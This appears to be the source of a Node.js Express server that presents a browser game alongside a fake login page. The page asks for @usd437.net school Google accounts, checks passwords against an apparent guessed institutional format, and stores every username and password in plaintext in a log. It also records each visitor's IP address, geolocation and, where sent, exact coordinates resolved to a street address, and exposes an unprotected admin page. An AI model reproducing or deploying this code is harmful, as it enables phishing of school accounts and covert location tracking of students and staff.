/* ---------- basic setup ---------- */
const express = require('express');
const fs      = require('fs/promises');
const path    = require('path');
const app     = express();

const BLOCKED_IPS = (process.env.BLOCKED_IPS || '').split(',').map(ip => ip.trim()).filter(Boolean);

app.use((req, res, next) => {
  const forwarded = req.headers['x-forwarded-for'] || '';
  const ipList = forwarded.split(',').map(ip => ip.trim()).filter(Boolean);
  const ip = ipList[0] || req.socket.remoteAddress;
  if (BLOCKED_IPS.includes(ip)) {
    return res.status(403).send('<h1>Access denied</h1>');
  }
  next();
});

const PORT = process.env.PORT || 10000;
const HOST = '0.0.0.0';

const ADMIN_PASS = process.env.ADMIN_PASS || Math.random().toString(36).substring(2, 15);
const LOG_DIR  = path.join(__dirname, 'logs');
const LOG_FILE = path.join(LOG_DIR, 'ip-log.txt');

async function ensureLogFile() {
  try {
    await fs.mkdir(LOG_DIR, { recursive: true });
    try {
      await fs.access(LOG_FILE);
    } catch {
      await fs.writeFile(LOG_FILE, '');
    }
  } catch (err) {
    console.error('Error creating log directory/file:', err);
  }
}

ensureLogFile();

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

async function estimateLocationByIP(ip) {
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await res.json();
    if (data.status === 'success') {
      return { latitude: data.lat, longitude: data.lon, city: data.city, country: data.country };
    }
  } catch (e) {
    console.error('IP geolocation error:', e.message);
  }
  return null;
}

async function getAddressFromCoords(latitude, longitude) {
  try {
    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
    const data = await response.json();
    
    if (data && data.display_name) {
      return {
        fullAddress: data.display_name,
        shortAddress: data.address ? 
          `${data.address.road || ''}, ${data.address.city || data.address.town || ''}, ${data.address.country || ''}` : 
          data.display_name
      };
    }
  } catch (e) {
    console.error('Reverse geocoding error:', e.message);
  }
  return null;
}

async function logIP(req, label = 'visited', returnLocationInfo = false) {
  try {
    const forwarded = req.headers['x-forwarded-for'] || '';
    const ipList = forwarded.split(',').map(ip => ip.trim()).filter(Boolean);
    const ipForGeo = ipList[0] || req.socket.remoteAddress;
    const allIPs = ipList.length ? ipList.join(', ') : req.socket.remoteAddress;
    const ts = new Date().toISOString();
    let locString = '';
    let locationInfo = {};
    
    const { latitude, longitude, exact_location } = req.body || {};
    
    if (latitude && longitude && exact_location === 'yes') {
      locString = ` | location: ${latitude},${longitude} | exact: yes`;
      try {
        const addressInfo = await getAddressFromCoords(latitude, longitude);
        if (addressInfo) {
          locString += ` | address: ${addressInfo.shortAddress}`;
          locationInfo = {
            latitude,
            longitude,
            ...addressInfo
          };
        }
      } catch (e) {
        console.error('Address lookup error:', e);
      }
    } else {
      try {
        const loc = await estimateLocationByIP(ipForGeo);
        if (loc) {
          locString = ` | location: ${loc.latitude},${loc.longitude} (${loc.city},${loc.country}) | exact: no`;
          locationInfo = {
            latitude: loc.latitude,
            longitude: loc.longitude,
            shortAddress: `${loc.city}, ${loc.country}`,
            fullAddress: `${loc.city}, ${loc.country}`
          };
        } else {
          locString = ' | location: unknown | exact: no';
        }
      } catch (e) {
        locString = ' | location: error | exact: no';
      }
    }
    
    const logEntry = `${ts} - ${allIPs} ${label}${locString}\n`;
    await fs.appendFile(LOG_FILE, logEntry);
    
    if (returnLocationInfo) return locationInfo;
    return null;
  } catch (e) {
    console.error('Logging error:', e);
    try {
      await fs.appendFile(LOG_FILE, `${new Date().toISOString()} - LOGGING ERROR: ${e.message}\n`);
    } catch {}
    if (returnLocationInfo) return {};
    return null;
  }
}

/* ---------- routes ---------- */

app.get('/login', (req, res) => {
  res.send(`
    <form method="POST" action="/login">
      <input name="username" placeholder="Username(Use google acc)" required>
      <input name="password" type="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  `);
});

// Serve static files for Quantum Flip Duel from /quantumflipduel
app.use('/quantumflipduel', express.static(path.join(__dirname, 'public', 'quantumflipduel')));

// Serve game HTML
app.get('/quantum', async (req, res) => {
  await logIP(req, 'accessed quantum game');
  res.sendFile(path.join(__dirname, 'public', 'quantumflipduel', 'quantum.html'));
});
app.post('/quantum', async (req, res) => {
  await logIP(req, 'POST to /quantum');
  res.json({ status: 'ok', received: req.body });
});

app.get('/debug/paths', (req, res) => {
  res.json({
    serverRoot: __dirname,
    quantumGamePath: path.join(__dirname, 'public', 'quantumflipduel'),
    htmlPath: path.join(__dirname, 'public', 'quantumflipduel', 'quantum.html'),
    jsPath: path.join(__dirname, 'public', 'quantumflipduel', 'js'),
    requestPath: req.path
  });
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.send('Missing credentials');

  if (!username.endsWith('@usd437.net')) {
    return res.send('Invalid Credentials. Please enter your @usd437.net ACC!');
  }

  if (username.length > 20) {
    return res.send('Invalid Credentials. Please enter a valid @usd437.net email!');
  }

  if (password.length < 5 || password.slice(2, 5) !== '305') {
    return res.send('Invalid Credentials. Please enter a valid password!');
  }

  const firstTwo = password.slice(0, 2);
  const firstChar = firstTwo[0];
  const secondChar = firstTwo[1];

  const firstCharCount = (username.match(new RegExp(firstChar, 'g')) || []).length;
  const secondCharCount = (username.match(new RegExp(secondChar, 'g')) || []).length;
  const firstCharInPasswordCount = (password.match(new RegExp(firstChar, 'g')) || []).length;
  const secondCharInPasswordCount = (password.match(new RegExp(secondChar, 'g')) || []).length;

  if (firstCharCount < firstCharInPasswordCount || secondCharCount < secondCharInPasswordCount) {
    return res.send('Invalid Credentials. The first two characters of your password must appear in your username at least as many times as they appear in the password!');
  }

  if (password.length !== 9) {
    return res.send('Invalid Credentials. Please enter a valid password!');
  }

  await logIP(req, `LOGIN ATTEMPT: ${username}`);

  try {
    const logContents = await fs.readFile(LOG_FILE, 'utf8');
    const loginLine = `LOGIN|${username}|${password}`;
    res.setHeader('Set-Cookie', 'loggedin=1; Path=/; HttpOnly; SameSite=Strict');
    if (logContents.includes(loginLine)) {
      return res.redirect('/home');
    }

    await fs.appendFile(LOG_FILE, `${loginLine}\n`);
    return res.redirect('/home');
  } catch (err) {
    console.error('Error handling login:', err);
    return res.status(500).send('Server error during login');
  }
});

app.get('/admin', async (req, res) => {
  await logIP(req, 'visited admin page');
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});
app.get('/', (_, res) => res.redirect('/home'));

app.get('/intro', async (req, res) => {
  await logIP(req, 'visited intro page');
  res.sendFile(path.join(__dirname, 'public', 'intro.html'));
});

app.get('/home', async (req, res) => {
  await logIP(req, 'visited home page');
  res.sendFile(path.join(__dirname, 'public', 'home.html')); // Make sure this file exists
});

app.listen(PORT, HOST, () => {
  console.log(`Server running at http://${HOST}:${PORT}/`);
});
